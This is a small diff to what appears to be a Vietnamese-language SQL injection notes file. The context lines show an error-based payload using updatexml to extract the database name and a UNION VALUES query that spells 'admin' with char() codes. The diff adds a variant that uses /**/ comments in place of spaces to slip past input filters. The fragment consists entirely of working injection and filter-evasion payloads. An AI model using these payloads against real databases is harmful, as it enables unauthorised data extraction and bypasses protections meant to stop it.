@@ -36,4 +36,6 @@ Sử dụng updateXML: 1',updatexml(1,concat(0x7e,(select database()),0x7e),1))-
 
 select name from demo where name = 'dasd' union values(char(97)||char(100)||char(109)||char(105)||char(110))
 
+1/**/union/**/values(char(97)||char(100)||char(109)||char(105)||char(110))
+
 
